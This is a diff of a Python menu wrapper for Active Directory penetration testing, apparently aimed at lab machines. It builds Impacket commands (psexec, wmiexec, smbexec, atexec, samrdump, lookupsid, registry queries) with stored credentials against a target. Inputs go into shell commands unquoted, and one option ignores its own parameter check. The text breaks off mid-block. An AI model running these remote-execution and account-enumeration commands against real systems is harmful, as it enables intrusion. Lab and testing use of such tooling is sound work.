@@ -9,7 +9,7 @@
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna                                                                
+# Version : Monteverde                                                                
 # Details : Load required imports.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -27,7 +27,7 @@ from termcolor import colored					# pip install termcolor
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Sauna                                                                
+# Version : Monteverde                                                                
 # Details : Conduct simple and routine tests on user supplied arguements.   
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -47,7 +47,7 @@ BUG = 0			# BUGHUNT ON/OFF
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Sauna
+# Version : Monteverde
 # Details : Create function calls from main.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -68,6 +68,12 @@ def dpadding(variable,value):
          variable += " "
       else:
          variable += "."
+   return variable
+
+def rpadding(variable,value):
+   while len(variable) < value:
+      temp = variable
+      variable = "." + temp
    return variable
 
 def gettime(value):
@@ -258,7 +264,7 @@ def options():
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna                                                                
+# Version : Monteverde                                                                
 # Details : Display universal header.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -275,7 +281,7 @@ print("BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS\n")
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Sauna
+# Version : Monteverde
 # Details : Boot the system and initialise program files and variables.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -311,7 +317,7 @@ PASS = [" "*COL4]*MAXX  # PASSWORDS
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Sauna
+# Version : Monteverde
 # Details : Check the config file for stored variables.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
@@ -370,7 +376,7 @@ input("\n[*] Press ENTER key to continue...")
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Sauna
+# Version : Monteverde
 # Details : Start the main menu controller.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
@@ -386,7 +392,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Save current data to config.txt and exit the program.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -420,7 +426,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change remote DNS SERVER name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -441,7 +447,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change remote IP address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -459,7 +465,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change the current USER.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -471,16 +477,16 @@ while True:
       if USR != "":
          if len(USR) < COL1:
             USR = padding(USR, COL1)
-         for a in range(0, MAXX):
-            if USER[a].rstrip(" ") == USR.rstrip(" "):
-               NTM = PASS[a]	# UPDATE HASH VALUE TO MATCH USER.
+         for x in range(0, MAXX):
+            if USER[x].rstrip(" ") == USR.rstrip(" "):
+               NTM = PASS[x] # UPDATE HASH VALUE TO MATCH USER.
       else:
          USR = BAK
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change the current USERS PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -498,7 +504,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change the current USERS HASH value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -516,7 +522,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change the remote DOMAIN name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -537,7 +543,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change the remote DOMAIN SID value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -555,7 +561,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change the remote SHARE name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -573,7 +579,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change the remote Windows USER to impersonate.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -591,7 +597,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change the remote windows COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -609,7 +615,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Reset local TIME to match kerberos skew. 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -628,7 +634,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change local working DIRECTORY.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -650,7 +656,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Ping localhost IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -665,23 +671,20 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - adidnsdump -u DOMAIN\USER -p PASSWORD DOMAIN --include-tombstoned -r
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '14':
       CheckParams = 0
+
       if (DOM[:5] == "EMPTY"):
          print("\n[-] Domain name not specified...")
          CheckParams = 1
 
-      if (USR[:2] == '""'):
-         print("\n[-] User name not specified...")
-         CheckParams = 1
-
-      if (PAS[:2] == '""'): 
-         print("\n[-] Password not specified...")
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
@@ -693,7 +696,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - fierce -dns DNS SERVER.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -708,7 +711,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - nmap -sU -O -p 123 --script ntp-info IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -723,7 +726,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=DOMAIN IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -731,11 +734,11 @@ while True:
    if selection == '17':
       CheckParams = 0
 
-      if DOM[:5] != "EMPTY":
+      if DOM[:5] == "EMPTY":
          print("\n[-] Domain name has not been specified...")
          CheckParams = 1
 
-      if TIP[:5] != "EMPTY":
+      if TIP[:5] == "EMPTY":
          print("\n[-] Remote IP address has not been specified...")
          CheckParams = 1
 
@@ -746,7 +749,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Intense quick TCP scan.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -761,7 +764,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Full, slow and comprehensive nmap scan.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -776,460 +779,690 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - getArch.py -target IP
 # Details : 32/64 bit
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '20':
-      command(PATH + "getArch.py -target " + TIP.rstrip(" "))
+      if TIP[:5] != "EMPTY":
+         command(PATH + "getArch.py -target " + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - netview.py DOMAIM/USER:PASSWORD -target IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='21':
-      command(PATH + "netview.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -target " + TIP.rstrip(" "))
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         command(PATH + "netview.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -target " + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - services.py USER:PASSWOrd@IP list.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='22':
-      command(PATH + "services.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " list")
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         command(PATH + "services.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " list")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - atexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '23':
-      command(PATH + "atexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " '" + CMD.rstrip(" ") + "'")
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         command(PATH + "atexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " '" + CMD.rstrip(" ") + "'")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - dcomexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '24':
-      command(PATH + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" '") + CMD.rstrip(" ") + "'")
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      command(PATH + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " '" + CMD.rstrip(" ") + "'")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - psexec.py DOMAIN/USER:PASSWORD@IP cmd.exe.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '25':
-      if USR.rstrip(" ") != "Administrator":
-         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > SHARES.tmp")
-         command("cat SHARES.tmp")
-         command("cat SHARES.tmp | wc -l > count.txt")
-         count = int(linecache.getline("count.txt", 1))
-         command("sed -i '1,3d' SHARES.tmp")
-         command("sed -i -e 's/share //g' SHARES.tmp")
-         if count > 0:
-            for x in range(0, MAXX):
-               SHAR[x] = " "*COL2			# Clean current values.
-         for x in range(0, count):
-            SHAR[x] = linecache.getline("SHARES.tmp",x + 1)
-            SHAR[x] = SHAR[x].replace("[-] ","")
-            SHAR[x] = SHAR[x].replace("'","")
-            SHAR[x] = SHAR[x].replace("is not writable.","")
-            SHAR[x] = padding(SHAR[x], COL2)
-         os.remove("SHARES.tmp")
-      else:
-         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         if USR.rstrip(" ") != "Administrator":
+            command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > SHARES.tmp")
+            command("cat SHARES.tmp")
+            command("cat SHARES.tmp | wc -l > count.txt")
+            count = int(linecache.getline("count.txt", 1))
+            command("sed -i '1,3d' SHARES.tmp")
+            command("sed -i -e 's/share //g' SHARES.tmp")
+            if count > 0:
+               for x in range(0, MAXX):
+                  SHAR[x] = " "*COL2			# Clean current values.
+            for x in range(0, count):
+               SHAR[x] = linecache.getline("SHARES.tmp",x + 1)
+               SHAR[x] = SHAR[x].replace("[-] ","")
+               SHAR[x] = SHAR[x].replace("'","")
+#              SHAR[x] = SHAR[x].replace("is not writable.","")
+               SHAR[x] = dpadding(SHAR[x], COL2)
+            os.remove("count.txt")
+            os.remove("SHARES.tmp")
+         else:
+            command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - smbexec.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '26':
-      command(PATH + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         command(PATH + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - wmiexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '27':
-      command(PATH + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         command(PATH + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - ifmap.py IP 135.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '28':
-      command(PATH + "ifmap.py " + TIP.rstrip(" ") + " 135")
+      if TIP[:5] != "EMPTY":
+         command(PATH + "ifmap.py " + TIP.rstrip(" ") + " 135")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - opdump.py IP 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '29':
       ifmap = input("\n[*] Please enter MSRPC interface (ifmap) : ")     
-      if ifmap != "":
+      if ifmap != "" and TIP[:5] != "EMPTY":
          command(PATH + "opdump.py " + TIP.rstrip(" ") + " 135 " + ifmap)
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - enum4linux -u "" -p "" REMOTE IP.
 # Details : Anonymous login check.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '30':
-      print("\n[*] Trying with a null session first...")
-      command("enum4linux -v " + TIP.rstrip(" "))
-      print("\n[*] Now trying with user " + USR.rstrip(" ") + " and password " + PAS.rstrip(" ") + "...")
-      command("enum4linux -v -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") +" " + TIP.rstrip(" "))
+      if TIP[:5] != "EMPTY":
+         print("\n[*] Trying with a null session first...")
+         command("enum4linux -v " + TIP.rstrip(" "))
+
+         print("\n[*] Now trying with user " + USR.rstrip(" ") + " and password " + PAS.rstrip(" ") + "...")
+         command("enum4linux -v -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") +" " + TIP.rstrip(" "))
       prompt()
 
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -GUC --da --full.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='31':
-      command(PATH + "windapsearch.py -d " + TIP.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -GUC --da --full")
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         command(PATH + "windapsearch.py -d " + TIP.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -GUC --da --full")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - lookupsid.py DOMAIN/USR:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='32':
-      print("\n[+] [*] Enumerating, please wait....\n")
-      command(PATH + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > DOMAIN.tmp")
-      command("cat DOMAIN.tmp | grep SidTypeGroup"); print ("")
-      command("cat DOMAIN.tmp | grep SidTypeAlias"); print ("")
-      command("cat DOMAIN.tmp | grep SidTypeUser"); print ("")
-      command("cat DOMAIN.tmp | grep 'Domain SID' > SID.tmp")
-      os.remove("DOMAIN.tmp")
-      SIDID = linecache.getline("SID.tmp", 1)
-      os.remove("SID.tmp")
+      CheckParams = 0
 
-      if SIDID != "":
-         SID = SIDID.replace('[+] Domain SID is: ',"")
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         print("\n[*] Enumerating, please wait....\n")
+         command(PATH + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > DOMAIN.tmp")
+         command("cat DOMAIN.tmp | grep SidTypeGroup"); print ("")
+         command("cat DOMAIN.tmp | grep SidTypeAlias"); print ("")
+         command("cat DOMAIN.tmp | grep SidTypeUser"); print ("")
+         command("cat DOMAIN.tmp | grep 'Domain SID' > SID.tmp")
+         os.remove("DOMAIN.tmp")
+         SIDID = linecache.getline("SID.tmp", 1)
+         os.remove("SID.tmp")
+
+         if SIDID != "":
+            SID = SIDID.replace('[*] Domain SID is: ',"")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - ./samrdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='33':
-      print("\n[*] Enumerating, please wait...")
-      os.remove("users.txt")	# DELETE CURRENT VERSION
-      command(PATH + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > USERS.tmp")
-      command("sed -i -n '/Found user: /p' USERS.tmp")	# SELECT ONLY FOUND USERS
-      command("sort USERS.tmp > USERS2.tmp")			# SORT USERS ALPHANUMERICALLY 
-      os.remove("USERS.tmp")
-      command("mv USERS2.tmp USERS.tmp")      
+      CheckParams = 0
 
-      for x in range (0, MAXX):
-         USER[x] = linecache.getline('USERS.tmp', x+1)
-         if USER[x] != "":
-            USER[x] = USER[x].replace("Found user: ", "")
-            USER[x] = USER[x].split(",")
-            USER[x] = USER[x][0]
-            USER[x] = padding(USER[x], COL3)
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         print("\n[*] Enumerating, please wait...")
+         os.remove("users.txt")					# DELETE CURRENT VERSION
+         command("touch users.txt")				# CREATE EMPTY NEW ONE
+         command(PATH + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > USERS.tmp")
+         command("sed -i -n '/Found user: /p' USERS.tmp")	# SELECT ONLY FOUND USERS
+         command("sort USERS.tmp > USERS2.tmp")			# SORT USERS ALPHANUMERICALLY 
+         os.remove("USERS.tmp")
+         command("mv USERS2.tmp USERS.tmp")      
+
+         for x in range (0, MAXX):
+            USER[x] = linecache.getline('USERS.tmp', x+1)
             if USER[x] != "":
-               print("[+] Found user " + USER[x])
-               command("echo " + USER[x] + " >> users.txt")	# ASSIGN USERS NAME
+               USER[x] = USER[x].replace("Found user: ", "")
+               USER[x] = USER[x].split(",")
+               USER[x] = USER[x][0]
+               USER[x] = padding(USER[x], COL3)
+               if USER[x] != "":
+                  print("[+] Found user " + USER[x])
+                  command("echo " + USER[x] + " >> users.txt")	# ASSIGN USERS NAME
+               else:
+                  USER[x] = " "*COL3				# ASSIGN EMPTY USERS
+               PASS[x] = "."*COL4				# RESET PASSWORDS
             else:
-               USER[x] = " "*COL3				# ASSIGN EMPTY USERS
-            PASS[x] = "."*COL4					# RESET PASSWORDS
-         else:
-            USER[x] = " "*COL3
-            PASS[x] = " "*COL4   
+               USER[x] = " "*COL3
+               PASS[x] = " "*COL4   
    
-      os.remove("USERS.tmp")	# CLEAR WORK FILE
-      print("[*] All done!")
+         os.remove("USERS.tmp")	# CLEAR WORK FILE
+         if USER[1][:1] == " ":
+            print ("[-] Errno 104 - Connection reset by peer...")
+            print ("[*] No entries received.")
+         else:
+            print("[*] All done!")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - ./rpcdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='34':
-      command(PATH + "rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         command(PATH + "rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - reg.py DOMAIN/USER:PASSWORD@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s.
 # Details : #HKEY_LOCAL_MACHINE\SAM
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='35':
-      command(PATH + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " query -keyName HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s")
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         command(PATH + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " query -keyName HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - smbclient -L \\\\IP -U USER%PASSWORD
 # Modified: 
 # -------------------------------------------------------------------------------------
 
    if selection =='36':
-      command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
